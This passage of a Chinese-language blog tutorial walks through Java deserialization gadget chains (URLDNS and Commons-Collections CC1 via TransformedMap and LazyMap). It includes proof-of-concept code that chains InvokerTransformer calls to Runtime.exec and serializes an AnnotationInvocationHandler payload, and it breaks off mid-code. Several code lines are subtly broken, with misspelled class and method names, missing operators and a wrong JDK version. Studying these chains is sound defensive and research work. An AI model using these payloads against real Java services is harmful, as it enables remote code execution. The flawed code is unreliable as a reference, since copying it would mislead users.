<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns6.png" class>
<p>进入其中的hashcode()方法，查看其中的逻辑</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns7.png" class>
<p>继续进入看其中的逻辑，其中有一个getHostAddress()。</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns8.png" class>
<p>进入这个函数内部逻辑，getHostAddress()中里面，看到下面的getByName()。</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns9.png" class>
<p>这里面这个函数直接是获取ip地址，也就是发起一次dns解析，也就是说到这里就正式结束了，代码在这里迎来了反序列化的终点。</p>
<p>所以我们可以完整的写下它的整个反序列化链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">readobject-&gt;hash()-&gt;hashcode()-&gt;handler.hashcode()-&gt;getHostAddress()-&gt;getbyname()</span><br><span class="line">写成栈的形式</span><br><span class="line"><span class="number">1.</span> HashMap-&gt;readObject()</span><br><span class="line"><span class="number">2.</span> HashMap-&gt;hash()</span><br><span class="line"><span class="number">3.</span> URL-&gt;hashCode()</span><br><span class="line"><span class="number">4.</span> URLStreamHandler-&gt;hashCode()</span><br><span class="line"><span class="number">5.</span> URLStreamHandler-&gt;getHostAddress()</span><br><span class="line"><span class="number">6.</span> InetAddress-&gt;getByName()</span><br><span class="line">HashMap#readObject()-&gt;HashMap#hash()-&gt;URL#hashCode()-&gt;URLStreamHandler#hashCode()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在
java.util.HashMap 中；然后，设置这个 URL 对象的 hashCode 为初始值 -1
，这样反序列化时将会重新计算 其 hashCode
，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode()</p>
<p>从最终的利用角度而言，这个漏洞的结果并不是很好，事实上并不能被称之为一个漏洞，只有简单的一次dns的请求。</p>
<h4 id="cc链">CC链</h4>
<p>在urldns的学习过程中我们明白urldns利用链的危害性很小仅仅是能够访问一下外面的dns，因此在很多情况下反序列化教程当中都会对这个利用链避之不谈。而CC链无疑是最出名的利用链了，它的危害程度以及知名度都远超urldns可以说是反序列化利用连里面的“明星选手”。</p>
<h5 id="cc1链之transformedmap">CC1链之TransformedMap</h5>
<p>这是一条不存在于ysoserial当中的一条链，在p神的java安全漫谈当中作为开篇进行了讲述</p>
<p>下面是p神的案例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line"> 	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> 		Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">		<span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">		<span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,transformerChain);</span><br><span class="line"> 		outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC1.png" class>
<p>在上面的代码中涉及到了一些类和接口：</p>
<h6 id="transformedmap">TransformedMap</h6>
<p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure>
<p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。
简单的理解回调就是在对value进行操作时必定会触发的方法。</p>
<h6 id="transformer">Transformer</h6>
<p>Transformer是⼀个接口，它只有⼀个待实现的⽅法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，也就是所谓的回调。</p>
<h6 id="constanttransformer">ConstantTransformer</h6>
<p>ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">	<span class="built_in">super</span>();</span><br><span class="line">	iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="invokertransformer">InvokerTransformer</h6>
<p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执行任意⽅法，这也是反序列化能执⾏任意代码的关键。</p>
<p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执行的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">	<span class="built_in">super</span>();</span><br><span class="line"> 	iMethodName = methodName;</span><br><span class="line"> 	iParamTypes = paramTypes;</span><br><span class="line"> 	iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">		<span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">		<span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"> 	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">	iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="chainedtransformer">ChainedTransformer</h6>
<p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，下面是p神做的示意图：</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC2.png" class>
<p>代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line"> object = iTransformers[i].transform(object);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="理解demo">理解demo</h6>
<p>在了解了前文所说的transformer的定义之后，我们就可以理解代码当中前几行的内容。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
<p>首先定义了一个类型为Transformer的数组，里面第一个对象是ConstantTransformer类型，该类型会将传入的参数存起来然后在回调时进行对象return。第二个是InvokerTransformer类型的对象，该类型会在回调的时候执行传入的方法"exec"，里面的参数类型是String类型，然后传入的参数是一个calc。</p>
<p>最终把上面这三个Tranformer都装进TransformerChain当中等待回调</p>
<p>如何触发回调呢？我们需要使用之前介绍的TransformedMap对象，这个对象中的TransformedMap.decorate:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>
<p>最后，怎么触发回调呢？就是向Map中放⼊⼀个新的元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br></pre></td></tr></table></figure>
<h6 id="poc构造">POC构造</h6>
<p>在前面的利用过程当中，触发漏洞的核心是向map中添加一个新的元素。在之前的demo当中我们用手工的方式来执行outerMap.put("test",
"xxxx");来触发漏洞，但在实际反序列化的时候我们需要找到一个类，他在反序列化的时候调用readobject，而sun.reflect.annotation.AnnotationInvocationHandler的readobject刚好有这样的操作。</p>
<p>下面是有关该类的readobject方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"><span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">	s.defaultReadObject();</span><br><span class="line">	<span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		annotationType = AnnotationType.getInstance(type);</span><br><span class="line">	&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">	<span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">	Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">	<span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">	<span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">	<span class="keyword">for</span>(Map.Entry&lt;String, Object&gt; memberValue :：memberValues.entrySet()) &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">		Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">		<span class="keyword">if</span>(memberType != <span class="literal">null</span>) &#123; <span class="comment">// i.e. member still exists</span></span><br><span class="line">			<span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">			<span class="keyword">if</span>(!(memberType.isInstance(value) ||</span><br><span class="line">				value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">				memberValue.setValue(</span><br><span class="line">					<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">						value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">							annotationType.members().get(name)));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面的memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了
的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的
Transform，进而执行我们为其精心设计的任意代码。</p>
<p>所以我们在写poc的时候需要创建一个AnnotationInvocationHandler对象，并将前面构造的HashMap放进去</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclareConstrutor(Class.class, Map.class);</span><br><span class="line">construct.serAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终写出payload如下所示，这个poc在jdk71中是可以执行命令的，但是在高版本的jdk当中并不能执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;)</span><br><span class="line">                InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;)</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclareConstrutor(Class.class, Map.class);</span><br><span class="line">        construct.serAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        </span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(barr,toByteArray());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="总结">总结：</h6>
<p>AnnotationInvocationHandler#readObject-&gt;HashMap#setvalue-&gt;TransformerMap/valueTransformer-&gt;TransformerChain</p>
<h5 id="cc1之lazymap">CC1之LazyMap</h5>
<p>在之前的分析当中p神的java安全漫谈带着我们分析了一个在ysoserial里面不存在的一条利用链，而且这条链的利用条件也比较苛刻，他要求的jdk版本非常低。在高版本当中jdk源码当中的AnnotationInvocationHandler#readObject-进行了修改，不再能够进行利用。</p>
<h6 id="lazymap">LazyMap</h6>
<p>ysoserial中使用的利用链是LazyMap，其与TransformedMap类似，都来自于Common-Collections库，并继承AbstractMapDecorator。</p>
<p>LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执
行transform，而LazyMap是在其get方法中执行的 factory.transform</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line"><span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">map.put(key, value);</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些，原因是在sun.reflect.annotation.AnnotationInvocationHandler的readObject方法中并没有直接调用到Map的get方法。所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get：</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC3.png" class>
<p>虽然在invoke()当中能够调用get()方法，但是什么方式可以调用invoke()方法呢？这里要引入新的概念，Java对象代理</p>
<h6 id="java对象代理">Java对象代理</h6>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span></span><br><span class="line"><span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>
<p>Proxy.newProxyInstance
的第一个参数是ClassLoader；第二个参数是我们需要代理的对象集合（最后要封装成什么样子）；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。具体代理的逻辑会在Invocationhandler中实现。代理的作用是什么呢？当调用被代理对象的任意方法的时候，就会触发Invocationhandler当中的invoke方法。</p>
<p>对于sun.reflect.annotation.AnnotationInvocationHandler来讲，它本身就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, 